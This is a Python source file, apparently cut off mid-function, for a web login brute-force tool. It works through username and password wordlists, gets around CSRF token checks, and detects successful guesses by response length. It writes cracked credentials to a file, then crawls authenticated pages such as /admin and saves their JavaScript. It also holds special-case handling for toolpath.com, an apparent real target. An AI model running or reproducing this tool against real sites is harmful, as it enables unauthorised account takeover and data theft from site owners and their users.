import json
import re
import os

import requests
from urllib.parse import urlparse, parse_qs, urljoin


class send:
    def __init__(self, url, reqeust_data, target_page=None, page_name=None):
        requests.packages.urllib3.disable_warnings()

        self.reqeust_data = reqeust_data
        self.params = reqeust_data['params']
        self.path = reqeust_data['url']
        self.method = reqeust_data['method']
        self.url = url
        self.target_page = target_page  # Add target page parameter
        self.page_name = page_name or "target_page"  # Add page name for file saving

        with open("users.txt", 'r') as f:
            self.users = f.read().splitlines()
        with open("passwords.txt", 'r') as f:
            self.passwords = f.read().splitlines()
        with open("users_both.txt", 'r') as f:
            self.users_both = f.read().splitlines()

        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
            "Accept": "application/json, text/javascript, */*; q=0.01"
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)

        self.base_response2 = None
        self.base_response1 = None

        self.key_password = None
        self.key_username = None

        self.send_url = None
        self.base_url = None
        self.login_url = None
        self.final_params = None
        self.original_csrf_token = None  # Store original CSRF token from browser session
        self.csrf_from_cookies = None  # Store CSRF token from cookies

        # 创建输出目录用于保存源码
        self.output_dir = "extracted_sources"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def run(self):
        if self.params is None:
            pass
        # Initialize session by visiting the login page first
        self.initialize_session()
        if self.handle_param() == 0:
            pass

    def initialize_session(self):
        """Initialize session by visiting the login page to establish proper cookies/session state"""
        try:
            print("[INFO] 初始化会话状态...")
            # 添加更完整的请求头
            headers = self.headers.copy()
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            })
            
            response = self.session.get(self.url, headers=headers, verify=False)
            if response.status_code == 200:
                print(f"[INFO] 成功访问登录页面，状态码: {response.status_code}")
                # Print cookies for debugging
                if self.session.cookies:
                    print(f"[DEBUG] 会话cookies: {[cookie.name for cookie in self.session.cookies]}")
                    # Print cookie details for debugging
                    for cookie in self.session.cookies:
                        print(f"[DEBUG] Cookie: {cookie.name}={cookie.value[:20]}{'...' if len(cookie.value) > 20 else ''}")
                else:
                    print("[DEBUG] 没有设置cookies")
                print(f"[DEBUG] 响应内容长度: {len(response.text)}")
            else:
                print(f"[WARNING] 访问登录页面失败，状态码: {response.status_code}")
                print(f"[DEBUG] 错误响应内容: {response.text[:500]}")
        except Exception as e:
            print(f"[ERROR] 初始化会话失败: {e}")

    def verify_session_state(self):
        """验证当前会话状态是否有效"""
        try:
            print("[INFO] 验证会话状态...")
            # 尝试访问一个需要认证的页面来测试会话
            test_headers = self.headers.copy()
            test_headers.update({
                'Accept': 'application/json, text/html, */*',
                'Referer': self.url,
                'X-Requested-With': 'XMLHttpRequest'
            })
            
            # 对于toolpath.com，尝试访问dashboard或API端点
            if 'toolpath.com' in self.base_url:
                test_urls = [
                    urljoin(self.base_url, '/api/auth/session'),
                    urljoin(self.base_url, '/dashboard'),
                    urljoin(self.base_url, '/api/user')
                ]
            else:
                test_urls = [
                    urljoin(self.base_url, '/dashboard'),
                    urljoin(self.base_url, '/profile'),
                    urljoin(self.base_url, '/api/user')
                ]
            
            for test_url in test_urls:
                try:
                    response = self.session.get(test_url, headers=test_headers, verify=False, timeout=10)
                    if response.status_code == 200:
                        # 检查响应是否表明用户已登录
                        if any(indicator in response.text.lower() for indicator in ['dashboard', 'logout', 'profile', 'user', 'authenticated']):
                            print(f"[SUCCESS] 会话状态验证成功 - {test_url}")
                            return True
                    elif response.status_code == 401:
                        print(f"[WARNING] 会话已过期 - {test_url} 返回401")
                        return False
                except Exception as e:
                    print(f"[DEBUG] 测试URL {test_url} 失败: {e}")
                    continue
            
            print("[WARNING] 无法确定会话状态，假设会话有效")
            return True
            
        except Exception as e:
            print(f"[ERROR] 验证会话状态时出错: {e}")
            return True  # 默认假设会话有效

    def save_csrf_from_cookies(self):
        """保存来自cookies的CSRF token"""
        for cookie in self.session.cookies:
            if cookie.name == 'csrf':
                self.csrf_from_cookies = cookie.value
                print(f"[DEBUG] 保存cookie中的CSRF token: {self.csrf_from_cookies[:20]}...")
                break
        
    def handle_param(self):

        # 处理url
        self.login_url = urlparse(self.url)
        self.base_url = f"{self.login_url.scheme}://{self.login_url.netloc}"

        if self.path.startswith(('http://', 'https://')):
            self.send_url = self.path
        else:
            self.send_url = urljoin(self.base_url, self.path)
        print(self.send_url)

        # 将字符串转换为字典格式
        try:
            self.final_params = json.loads(self.params)
            # Store original CSRF token from browser session
            if 'csrf' in self.final_params:
                self.original_csrf_token = self.final_params['csrf']
                print(f"[INFO] 保存原始CSRF token: {self.original_csrf_token[:20]}...")
                
                # 对于toolpath，额外保存cookie中的CSRF token
                if 'toolpath.com' in self.base_url:
                    self.save_csrf_from_cookies()
            
            if self.get_param(self.final_params) == 0:
                return 0
            self.handle_response("json")
        except json.JSONDecodeError:
            # 如果 JSON 格式无效，则使用 parse_qs 转换为普通的键值对
            self.final_params = {k: v[0] for k, v in parse_qs(self.params).items()}.copy()
            # Store original CSRF token from browser session
            if 'csrf' in self.final_params:
                self.original_csrf_token = self.final_params['csrf']
                print(f"[INFO] 保存原始CSRF token: {self.original_csrf_token[:20]}...")
                
                # 对于toolpath，额外保存cookie中的CSRF token
                if 'toolpath.com' in self.base_url:
                    self.save_csrf_from_cookies()
            
            if self.get_param(self.final_params) == 0:
                return 0
            self.handle_response()

    def handle_response(self, param_type=""):
        # 如果参数中包含CSRF token，首先使用原始token
        if 'csrf' in self.final_params:
            if self.original_csrf_token:
                self.final_params['csrf'] = self.original_csrf_token
                print(f"[INFO] 使用原始CSRF token: {self.original_csrf_token[:20]}...")
            else:
                # 如果没有原始token，再尝试获取新的
                csrf_token = self.get_csrf_token()
                if csrf_token:
                    self.final_params['csrf'] = csrf_token
                    print(f"[INFO] 更新CSRF token: {csrf_token[:20]}...")
        
        self.final_params[self.key_username] = "28173yajhshdkjaSAD"
        self.final_params[self.key_password] = "8043U5JHDGSDFQA"
        params = self.final_params

        self.base_response1 = self.send(params, param_type)

        # 如果CSRF错误且是第一次请求，尝试刷新token重试
        if self.base_response1.status_code == 400 and "CSRF" in self.base_response1.text:
            print("[INFO] 检测到CSRF错误，尝试刷新token重试...")
            new_csrf_token = self.get_csrf_token()
            if new_csrf_token and new_csrf_token != self.final_params.get('csrf'):
                self.final_params['csrf'] = new_csrf_token
                print(f"[INFO] 使用新CSRF token重试: {new_csrf_token[:20]}...")
                self.base_response1 = self.send(self.final_params, param_type)

        if "密" in self.base_response1.text:
            self.attack_both(self.final_params, param_type)
        elif "验" in self.base_response1.text:
            pass
        else:
            self.attack_username(self.final_params, param_type)

    def check_login_success(self, response):
        """检查是否登录成功"""
        try:
            # 检查JSON响应中是否包含redirect字段
            if response.headers.get('content-type', '').startswith('application/json'):
                data = response.json()
                if 'data' in data and data['data'] and 'redirect' in data['data']:
                    return True, data['data']['redirect']
        except:
            pass
        
        # 检查其他成功登录的标志
        success_indicators = [
            'dashboard', 'welcome', 'logout', 'profile', 
            'success', 'redirect', 'projects', 'home'
        ]
        
        response_text_lower = response.text.lower()
        for indicator in success_indicators:
            if indicator in response_text_lower:
                return True, None
                
        return False, None

    def extract_javascript_from_html(self, html_content, page_url):
        """从HTML内容中提取JavaScript代码"""
        javascript_blocks = []
        
        try:
            # 提取内联JavaScript (script标签内的代码)
            inline_js_pattern = r'<script[^>]*(?:type=["\']text/javascript["\'][^>]*)?[^>]*>(.*?)</script>'
            inline_matches = re.findall(inline_js_pattern, html_content, re.DOTALL | re.IGNORECASE)
            
            for i, js_content in enumerate(inline_matches):
                js_content = js_content.strip()
                if js_content:  # 只保存非空的JavaScript代码
                    javascript_blocks.append({
                        'type': 'inline',
                        'index': i + 1,
                        'content': js_content,
                        'source': f'inline_script_{i + 1}'
                    })
            
            # 提取外部JavaScript文件链接
            external_js_pattern = r'<script[^>]*src=["\']([^"\']+)["\'][^>]*>'
            external_matches = re.findall(external_js_pattern, html_content, re.IGNORECASE)
            
            for i, js_src in enumerate(external_matches):
                # 构建完整的JavaScript文件URL
                if js_src.startswith('/'):
                    js_url = urljoin(self.base_url, js_src)
                elif js_src.startswith('http'):
                    js_url = js_src
                else:
                    js_url = urljoin(page_url, js_src)
                
                javascript_blocks.append({
                    'type': 'external',
                    'index': i + 1,
                    'url': js_url,
                    'src': js_src,
                    'source': f'external_script_{i + 1}'
                })
        
        except Exception as e:
            print(f"[ERROR] 提取JavaScript时出错: {e}")
        
        return javascript_blocks

    def download_external_javascript(self, js_url):
        """下载外部JavaScript文件"""
        try:
            print(f"[INFO] 正在下载外部JavaScript: {js_url}")
            headers = self.headers.copy()
            headers.update({
                'Accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
                'Referer': self.url
            })
            
            response = self.session.get(js_url, headers=headers, verify=False, timeout=30)
            if response.status_code == 200:
                print(f"[SUCCESS] 成功下载JavaScript文件 (长度: {len(response.text)} 字符)")
                return response.text
            else:
                print(f"[WARNING] 下载JavaScript文件失败，状态码: {response.status_code}")
                return None
        except Exception as e:
            print(f"[ERROR] 下载JavaScript文件时出错: {e}")
            return None

    def fetch_source_after_login(self, redirect_path=None):
        """获取登录后的页面源码，专门提取JavaScript"""
        try:
            print("[INFO] 登录成功，开始获取页面并提取JavaScript源码...")
            
            # 验证会话状态
            if not self.verify_session_state():
                print("[WARNING] 会话状态验证失败，尝试重新初始化...")
                self.initialize_session()
            
            # 构建要访问的URL列表
            urls_to_fetch = []
            
            # 优先添加目标页面（如果指定）
            if self.target_page:
                if self.target_page.startswith(('http://', 'https://')):
                    target_url = self.target_page
                elif self.target_page.startswith('/'):
                    target_url = urljoin(self.base_url, self.target_page)
                else:
                    target_url = urljoin(self.base_url, '/' + self.target_page)
                urls_to_fetch.append(('target_page', target_url))
                print(f"[INFO] 将优先访问目标页面: {target_url}")
            
            if redirect_path:
                if redirect_path.startswith('/'):
                    redirect_url = urljoin(self.base_url, redirect_path)
                else:
                    redirect_url = redirect_path
                # 检查是否与目标页面重复
                if not any(url == redirect_url for _, url in urls_to_fetch):
                    urls_to_fetch.append(('redirect_page', redirect_url))
            
            # 添加一些常见的页面
            common_pages = [
                ('dashboard', '/dashboard'),
                ('projects', '/projects'),
                ('home', '/'),
                ('profile', '/profile'),
                ('settings', '/settings'),
                ('api_docs', '/api'),
                ('admin', '/admin')
            ]
            
            for name, path in common_pages:
                full_url = urljoin(self.base_url, path)
                # 避免重复，且避免与目标页面重复
                if not any(url == full_url for _, url in urls_to_fetch):
                    urls_to_fetch.append((name, full_url))
            
            # 创建特定网站的输出目录
            domain = urlparse(self.base_url).netloc
            site_output_dir = os.path.join(self.output_dir, domain)
            js_output_dir = os.path.join(site_output_dir, "javascript")
            if not os.path.exists(js_output_dir):
                os.makedirs(js_output_dir)
            
            # 设置访问头部
            fetch_headers = self.headers.copy()
            fetch_headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': self.url,
                'Upgrade-Insecure-Requests': '1'
            })
            
            all_javascript = []  # 收集所有JavaScript代码
            success_count = 0
            
            for page_name, url in urls_to_fetch:
                try:
                    print(f"\n[INFO] 正在获取页面: {page_name} ({url})")
                    response = self.session.get(url, headers=fetch_headers, verify=False)
                    
                    if response.status_code == 200:
                        print(f"[SUCCESS] 成功获取页面: {page_name} (长度: {len(response.text)} 字符)")
                        
                        # 提取JavaScript
                        js_blocks = self.extract_javascript_from_html(response.text, url)
                        
                        if js_blocks:
                            print(f"[INFO] 在页面 {page_name} 中发现 {len(js_blocks)} 个JavaScript块")
                            
                            # 为当前页面创建JavaScript汇总文件
                            # 对于目标页面使用自定义页面名称
                            if page_name == 'target_page' and self.page_name != 'target_page':
                                file_prefix = self.page_name
                                display_name = f"{self.page_name} (目标页面)"
                            else:
                                file_prefix = page_name
                                display_name = page_name
                                
                            page_js_file = os.path.join(js_output_dir, f"{file_prefix}_javascript.txt")
                            
                            with open(page_js_file, 'w', encoding='utf-8') as f:
                                f.write(f"=== JAVASCRIPT FROM PAGE: {display_name} ({url}) ===\n")
                                f.write(f"Extracted at: {__import__('datetime').datetime.now()}\n")
                                f.write(f"Total JavaScript blocks found: {len(js_blocks)}\n")
                                f.write("="*80 + "\n\n")
                                
                                for js_block in js_blocks:
                                    f.write(f"\n--- {js_block['type'].upper()} JAVASCRIPT #{js_block['index']} ---\n")
                                    
                                    if js_block['type'] == 'inline':
                                        f.write(f"Source: Inline script block {js_block['index']}\n")
                                        f.write(f"Length: {len(js_block['content'])} characters\n")
                                        f.write("--- CODE START ---\n")
                                        f.write(js_block['content'])
                                        f.write("\n--- CODE END ---\n\n")
                                        
                                        # 添加到总集合
                                        all_javascript.append({
                                            'page': display_name,
                                            'type': 'inline',
                                            'source': js_block['source'],
                                            'content': js_block['content']
                                        })
                                        
                                    elif js_block['type'] == 'external':
                                        f.write(f"External URL: {js_block['url']}\n")
                                        f.write(f"Original src: {js_block['src']}\n")
                                        
                                        # 下载外部JavaScript文件
                                        external_js_content = self.download_external_javascript(js_block['url'])
                                        
                                        if external_js_content:
                                            f.write(f"Downloaded successfully, Length: {len(external_js_content)} characters\n")
                                            f.write("--- CODE START ---\n")
                                            f.write(external_js_content)
                                            f.write("\n--- CODE END ---\n\n")
                                            
                                            # 添加到总集合
                                            all_javascript.append({
                                                'page': display_name,
                                                'type': 'external',
                                                'url': js_block['url'],
                                                'source': js_block['source'],
                                                'content': external_js_content
                                            })
                                            
                                            # 单独保存外部JavaScript文件
                                            ext_filename = f"{file_prefix}_external_{js_block['index']}.txt"
                                            ext_filepath = os.path.join(js_output_dir, ext_filename)
                                            with open(ext_filepath, 'w', encoding='utf-8') as ext_f:
                                                ext_f.write(f"External JavaScript from: {js_block['url']}\n")
                                                ext_f.write(f"Found on page: {display_name} ({url})\n")
                                                ext_f.write("="*80 + "\n")
                                                ext_f.write(external_js_content)
                                        else:
                                            f.write("Failed to download external JavaScript file\n\n")
                            
                            print(f"[SUCCESS] 保存页面JavaScript到: {page_js_file}")
                        else:
                            print(f"[INFO] 页面 {display_name} 未发现JavaScript代码")
                        
                        success_count += 1
                        
                    elif response.status_code in [301, 302, 303, 307, 308]:
                        redirect_location = response.headers.get('Location', '')
                        print(f"[INFO] 页面 {page_name} 重定向到: {redirect_location}")
                        
                        # 尝试跟随重定向
                        if redirect_location:
                            try:
                                final_response = self.session.get(redirect_location, headers=fetch_headers, verify=False)
                                if final_response.status_code == 200:
                                    print(f"[SUCCESS] 跟随重定向成功获取页面")
                                    
                                    # 处理重定向后的页面JavaScript
                                    js_blocks = self.extract_javascript_from_html(final_response.text, redirect_location)
                                    
                                    if js_blocks:
                                        redirect_js_file = os.path.join(js_output_dir, f"{page_name}_redirected_javascript.txt")
                                        
                                        with open(redirect_js_file, 'w', encoding='utf-8') as f:
                                            f.write(f"=== JAVASCRIPT FROM REDIRECTED PAGE: {page_name} ===\n")
                                            f.write(f"Original URL: {url}\n")
                                            f.write(f"Redirected to: {redirect_location}\n")
                                            f.write("="*80 + "\n\n")
                                            
                                            for js_block in js_blocks:
                                                if js_block['type'] == 'inline':
                                                    f.write(f"--- INLINE JAVASCRIPT #{js_block['index']} ---\n")
                                                    f.write(js_block['content'])
                                                    f.write("\n--- END ---\n\n")
                                                elif js_block['type'] == 'external':
                                                    external_js = self.download_external_javascript(js_block['url'])
                                                    if external_js:
                                                        f.write(f"--- EXTERNAL JAVASCRIPT #{js_block['index']} ({js_block['url']}) ---\n")
                                                        f.write(external_js)
                                                        f.write("\n--- END ---\n\n")
                                        
                                        print(f"[SUCCESS] 保存重定向页面JavaScript到: {redirect_js_file}")
                                    
                                    success_count += 1
                            except Exception as e:
                                print(f"[WARNING] 跟随重定向失败: {e}")
                        
                    elif response.status_code == 401:
                        print(f"[WARNING] 页面 {page_name} 需要认证 (401)，会话可能过期")
                        if page_name == 'target_page':
                            target_display = f"目标页面 ({self.page_name})" if hasattr(self, 'page_name') else "目标页面"
                            print(f"[ERROR] {target_display} 访问失败 - 需要认证！请检查登录状态是否正确")
                            # 尝试重新初始化会话
                            print("[INFO] 尝试重新初始化会话...")
                            self.initialize_session()
                            # 重试一次
                            retry_response = self.session.get(url, headers=fetch_headers, verify=False)
                            if retry_response.status_code == 200:
                                print(f"[SUCCESS] 重试后成功访问{target_display}!")
                                response = retry_response
                                # 重新处理这个响应（将处理代码复制到这里或者调用一个处理函数）
                            else:
                                print(f"[ERROR] 重试后仍无法访问{target_display}，状态码: {retry_response.status_code}")
                    elif response.status_code == 403:
                        print(f"[WARNING] 页面 {page_name} 访问被拒绝 (403)")
                        if page_name == 'target_page':
                            target_display = f"目标页面 ({self.page_name})" if hasattr(self, 'page_name') else "目标页面"
                            print(f"[ERROR] {target_display} 访问被拒绝！可能没有足够权限")
                    else:
                        print(f"[WARNING] 获取页面 {page_name} 失败，状态码: {response.status_code}")
                        if page_name == 'target_page':
                            target_display = f"目标页面 ({self.page_name})" if hasattr(self, 'page_name') else "目标页面"
                            print(f"[ERROR] {target_display} 访问失败！响应内容前500字符: {response.text[:500]}")
                        
                except Exception as e:
                    print(f"[ERROR] 获取页面 {page_name} 时出错: {e}")
                    if page_name == 'target_page':
                        target_display = f"目标页面 ({self.page_name})" if hasattr(self, 'page_name') else "目标页面"
                        print(f"[ERROR] {target_display} 访问异常！这可能导致无法获取期望的内容")
            
            # 创建总的JavaScript汇总文件
            if all_javascript:
                summary_file = os.path.join(js_output_dir, f"ALL_JAVASCRIPT_{domain}.txt")
                
                with open(summary_file, 'w', encoding='utf-8') as f:
                    f.write(f"=== ALL JAVASCRIPT CODE FROM {domain.upper()} ===\n")
                    f.write(f"Extraction time: {__import__('datetime').datetime.now()}\n")
                    f.write(f"Total pages processed: {success_count}\n")
                    f.write(f"Total JavaScript blocks: {len(all_javascript)}\n")
                    f.write("="*80 + "\n\n")
                    
                    for i, js_item in enumerate(all_javascript, 1):
                        f.write(f"\n{'='*20} JAVASCRIPT BLOCK #{i} {'='*20}\n")
                        f.write(f"Page: {js_item['page']}\n")
                        f.write(f"Type: {js_item['type']}\n")
                        f.write(f"Source: {js_item['source']}\n")
                        if 'url' in js_item:
                            f.write(f"URL: {js_item['url']}\n")
                        f.write(f"Content length: {len(js_item['content'])} characters\n")
                        f.write("-" * 40 + "\n")
                        f.write(js_item['content'])
                        f.write(f"\n{'-' * 40}\n")
                
                print(f"\n[SUCCESS] 创建JavaScript总汇总文件: {summary_file}")
            
            print(f"\n[INFO] JavaScript提取完成！")
            print(f"[INFO] 成功处理 {success_count} 个页面")
            print(f"[INFO] 提取到 {len(all_javascript)} 个JavaScript代码块")
            print(f"[INFO] JavaScript文件保存在目录: {js_output_dir}")
            
            # 记录成功登录和提取到output.txt
            with open("output.txt", 'a', encoding="utf-8") as f:
                f.write(f"\n=== 成功登录并提取JavaScript源码 ===\n")
                f.write(f"网站: {self.base_url}\n")
                f.write(f"登录URL: {self.url}\n")
                if self.target_page:
                    # 检查目标页面是否成功访问
                    target_accessed = any(page == 'target_page' for page, url in urls_to_fetch if url == self.target_page)
                    if target_accessed:
                        f.write(f"目标页面: {self.target_page} - 已访问\n")
                    else:
                        f.write(f"目标页面: {self.target_page} - 未访问或访问失败\n")
                f.write(f"成功处理页面数: {success_count}\n")
                f.write(f"JavaScript代码块数: {len(all_javascript)}\n")
                f.write(f"JavaScript保存目录: {js_output_dir}\n")
                f.write(f"时间: {__import__('datetime').datetime.now()}\n")
                f.write("="*50 + "\n")
            
        except Exception as e:
            print(f"[ERROR] 获取JavaScript源码过程中出错: {e}")

    def attack_username(self, params, param_type=""):
        print("[INFO] 开始爆破账号")
        csrf_refresh_count = 0  # 限制CSRF刷新次数
        # Use the first password from password dictionary or a common default
        test_password = self.passwords[0] if self.passwords else "admin123"
        print(f"[INFO] 使用测试密码: {test_password}")
        
        for user in self.users:
            # 只有在收到CSRF错误时才更新token，而不是每次都更新
            params[self.key_username] = user
            params[self.key_password] = test_password
            response = self.send(params, param_type)
            print(params)

            # 检查是否是CSRF错误，如果是，尝试刷新token重试
            if response.status_code == 400 and "CSRF" in response.text and csrf_refresh_count < 5:
                print(f"[WARNING] 用户{user}请求遇到CSRF错误，尝试刷新token... (第{csrf_refresh_count + 1}次)")
                csrf_token = self.get_csrf_token()
                if csrf_token and csrf_token != params.get('csrf'):
                    params['csrf'] = csrf_token
                    csrf_refresh_count += 1
                    print(f"[INFO] 使用新CSRF token重试用户{user}...")
                    response = self.send(params, param_type)
                    print(params)
                elif csrf_refresh_count == 0:  # 第一次尝试即使token相同也重试
                    csrf_refresh_count += 1
                    print(f"[INFO] 强制重试用户{user}（即使token相同）...")
                    response = self.send(params, param_type)
                    print(params)
                else:
                    print(f"[WARNING] 无法获取新的CSRF token或token未变化，跳过用户{user}")
                    continue  # 跳过当前用户，继续下一个

            # 检查是否登录成功
            is_success, redirect_path = self.check_login_success(response)
            if is_success:
                print(f"[SUCCESS] 爆破成功！用户名: {user}, 密码: {test_password}")
                print(f"[INFO] 开始获取网站源码...")
                self.fetch_source_after_login(redirect_path)
                return  # 成功后退出

            if self.check_response(response) == 0:
                break

            if len(response.text) != len(self.base_response1.text) and "密" in response.text:  # 发现不同的响应
                print(f"[INFO] 爆破出账号:{user}")
                self.final_params[self.key_username] = user
                self.final_params[self.key_password] = "8043U5JHDGSDFQA24"

                self.base_response2 = self.send(params, param_type)

                self.attacak_password(params, user, param_type)
                break
            print(
                f"请求用户名: {user}, 密码: {test_password}, 响应内容: {response.text}, 长度: {len(response.text)}")

    def attacak_password(self, params, user, param_type=""):
        print("[INFO] 开始爆破密码")
        csrf_refresh_count = 0  # 限制CSRF刷新次数
        
        for password in self.passwords:
            # 只有在收到CSRF错误时才更新token，而不是每次都更新
            params[self.key_username] = user
            params[self.key_password] = password
            response = self.send(params, param_type)
            print(params)

            # 检查是否是CSRF错误，如果是，尝试刷新token重试
            if response.status_code == 400 and "CSRF" in response.text and csrf_refresh_count < 5:
                print(f"[WARNING] 密码{password}请求遇到CSRF错误，尝试刷新token... (第{csrf_refresh_count + 1}次)")
                csrf_token = self.get_csrf_token()
                if csrf_token and csrf_token != params.get('csrf'):
                    params['csrf'] = csrf_token
                    csrf_refresh_count += 1
                    print(f"[INFO] 使用新CSRF token重试密码{password}...")
                    response = self.send(params, param_type)
                    print(params)
                elif csrf_refresh_count == 0:  # 第一次尝试即使token相同也重试
                    csrf_refresh_count += 1
                    print(f"[INFO] 强制重试密码{password}（即使token相同）...")
                    response = self.send(params, param_type)
                    print(params)
                else:
                    print(f"[WARNING] 无法获取新的CSRF token或token未变化，跳过密码{password}")
                    continue  # 跳过当前密码，继续下一个

            # 检查是否登录成功
            is_success, redirect_path = self.check_login_success(response)
            if is_success:
                print(f"[SUCCESS] 爆破成功！用户名: {user}, 密码: {password}")
                print(f"[INFO] 开始获取网站源码...")
                self.fetch_source_after_login(redirect_path)
                return  # 成功后退出

            if self.check_response(response) == 0:
                break
            if len(response.text) != len(self.base_response2.text):
                print("疑似爆破出密码，已保存至output.txt")
                with open("output.txt", 'a', encoding="utf-8") as f:
                    f.write(f"{self.url}\n")
                    f.write(f"username:{user}, password:{password}\n")
                    
                # 检查是否登录成功，如果是则获取源码
                is_success, redirect_path = self.check_login_success(response)
                if is_success:
                    print(f"[INFO] 检测到登录成功，开始获取网站源码...")
                    self.fetch_source_after_login(redirect_path)
                    return
            print(
                f"请求用户名: {user}, 密码: {password}, 响应内容: {response.text}, 长度: {len(response.text)}")

    def attack_both(self, params, param_type=""):
        print("[INFO] 同时爆破用户密码")
        csrf_refresh_count = 0  # 限制CSRF刷新次数
        
        for user in self.users_both:
            for password in self.passwords:
                # 只有在收到CSRF错误时才更新token，而不是每次都更新
                params[self.key_username] = user
                params[self.key_password] = password
                print(params)
                response = self.send(params, param_type)

                # 检查是否是CSRF错误，如果是，尝试刷新token重试
                if response.status_code == 400 and "CSRF" in response.text and csrf_refresh_count < 5:
                    print(f"[WARNING] 组合{user}:{password}请求遇到CSRF错误，尝试刷新token... (第{csrf_refresh_count + 1}次)")
                    csrf_token = self.get_csrf_token()
                    if csrf_token and csrf_token != params.get('csrf'):
                        params['csrf'] = csrf_token
                        csrf_refresh_count += 1
                        print(f"[INFO] 使用新CSRF token重试组合{user}:{password}...")
                        response = self.send(params, param_type)
                    elif csrf_refresh_count == 0:  # 第一次尝试即使token相同也重试
                        csrf_refresh_count += 1
                        print(f"[INFO] 强制重试组合{user}:{password}（即使token相同）...")
                        response = self.send(params, param_type)
                    else:
                        print(f"[WARNING] 无法获取新的CSRF token或token未变化，跳过组合{user}:{password}")
                        continue  # 跳过当前组合，继续下一个

                # 检查是否登录成功
                is_success, redirect_path = self.check_login_success(response)
                if is_success:
                    print(f"[SUCCESS] 爆破成功！用户名: {user}, 密码: {password}")
                    print(f"[INFO] 开始获取网站源码...")
                    self.fetch_source_after_login(redirect_path)
                    return  # 成功后退出

                if self.check_response(response) == 0:
                    break
                if len(response.text) != len(self.base_response1.text):
                    print("疑似爆破出密码，已保存至output.txt")
                    with open("output.txt", 'a', encoding="utf-8") as f:
                        f.write(f"{self.url}\n")
                        f.write(f"username:{user}, password:{password}\n")
                        
                    # 检查是否登录成功，如果是则获取源码
                    is_success, redirect_path = self.check_login_success(response)
                    if is_success:
                        print(f"[INFO] 检测到登录成功，开始获取网站源码...")
                        self.fetch_source_after_login(redirect_path)
                        return
                print(
                    f"请求用户名: {user}, 密码: {password}, 响应内容: {response.text}, 长度: {len(response.text)}")

    def get_param(self, data):
        found_password = False
        found_username = False
        pattern_user_name = re.compile(r'(user|name|id|acc|phon|email|mail)', re.IGNORECASE)
        pattern_pass = re.compile(r'(pass|pwd)', re.IGNORECASE)

        for key, value in data.items():
            if pattern_pass.search(key) and not found_password:
                self.key_password = key
                print(f"匹配到密码字段 {key}")
                found_password = True
            elif pattern_user_name.search(key) and not found_username:

                self.key_username = key
                print(f"匹配到用户名字段 {key}")
                found_username = True

        if found_password == found_username == 0:
            print("没有匹配到关键字")
            return 0

    def get_csrf_token(self):
        """尝试获取新的CSRF token"""
        try:
            print("[DEBUG] 开始获取新的CSRF token...")
            
            # 特殊处理toolpath.com
            if 'toolpath.com' in self.base_url:
                return self.get_toolpath_csrf_token()
            
            # 方法1: 重新访问登录页面获取新的session和CSRF token
            print("[DEBUG] 重新访问登录页面获取CSRF token")
            login_response = self.session.get(self.url, verify=False)
            if login_response.status_code == 200:
                print("[DEBUG] 成功重新访问登录页面")
                # 尝试从页面源码中提取CSRF token
                patterns = [
                    r'"csrfToken":"([^"]+)"',
                    r"'csrfToken':'([^']+)'",
                    r'"csrf":"([^"]+)"',
                    r"'csrf':'([^']+)'",
                    r'<meta name="csrf-token" content="([^"]+)"',
                    r'csrf["\']?\s*:\s*["\']([^"\']+)',
                    r'_token["\']?\s*:\s*["\']([^"\']+)'
                ]
                
                for i, pattern in enumerate(patterns):
                    match = re.search(pattern, login_response.text, re.IGNORECASE)
                    if match:
                        token = match.group(1)
                        print(f"[DEBUG] 从登录页面提取到CSRF token (模式{i+1}): {token[:20]}...")
                        return token
                        
                # 尝试从cookies中获取CSRF token
                print(f"[DEBUG] 检查cookies中的token，共有{len(list(self.session.cookies))}个cookies")
                for cookie in self.session.cookies:
                    if 'csrf' in cookie.name.lower() or 'token' in cookie.name.lower():
                        print(f"[DEBUG] 从cookie {cookie.name} 获取到token: {cookie.value[:20]}...")
                        return cookie.value
            
            # 方法2: 尝试从/api/auth/csrf获取
            csrf_endpoints = ['/api/auth/csrf', '/api/csrf', '/csrf', '/auth/csrf']
            for endpoint in csrf_endpoints:
                try:
                    csrf_url = urljoin(self.base_url, endpoint)
                    print(f"[DEBUG] 尝试从{endpoint}获取token")
                    response = self.session.get(csrf_url, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            for key in ['csrfToken', 'csrf', 'token']:
                                if key in data:
                                    token = data[key]
                                    print(f"[DEBUG] 从{endpoint}获取到{key}: {token[:20]}...")
                                    return token
                        except json.JSONDecodeError:
                            # 可能返回的是文本格式
                            if len(response.text) > 10 and len(response.text) < 100:
                                print(f"[DEBUG] 从{endpoint}获取到文本token: {response.text[:20]}...")
                                return response.text.strip()
                    else:
                        print(f"[DEBUG] {endpoint} 返回状态码: {response.status_code}")
                except Exception as e:
                    print(f"[DEBUG] 访问{endpoint}失败: {e}")
                    continue
            
            # 如果有原始token，先尝试使用它
            if self.original_csrf_token:
                print(f"[WARNING] 无法获取新token，回退使用原始token: {self.original_csrf_token[:20]}...")
                return self.original_csrf_token
                
            print("[WARNING] 无法获取任何CSRF token")
            return None
            
        except Exception as e:
            print(f"[ERROR] 获取CSRF token失败: {e}")
            return None

    def get_toolpath_csrf_token(self):
        """专门针对toolpath.com的CSRF token获取方法"""
        print("[INFO] 检测到toolpath.com，使用专门的CSRF处理方法")
        try:
            # 首先重新访问登录页面，确保会话状态正确
            print("[DEBUG] 重新初始化会话状态...")
            init_response = self.session.get(self.url, verify=False)
            if init_response.status_code == 200:
                print("[DEBUG] 会话重新初始化成功")
                
                # 打印所有cookies的详细信息
                print(f"[DEBUG] 当前所有cookies:")
                for cookie in self.session.cookies:
                    print(f"[DEBUG]   {cookie.name} = {cookie.value[:30]}{'...' if len(cookie.value) > 30 else ''}")
            
            # 方法1: 优先从cookie中获取CSRF token
            csrf_from_cookie = None
            for cookie in self.session.cookies:
                if cookie.name == 'csrf':
                    csrf_from_cookie = cookie.value
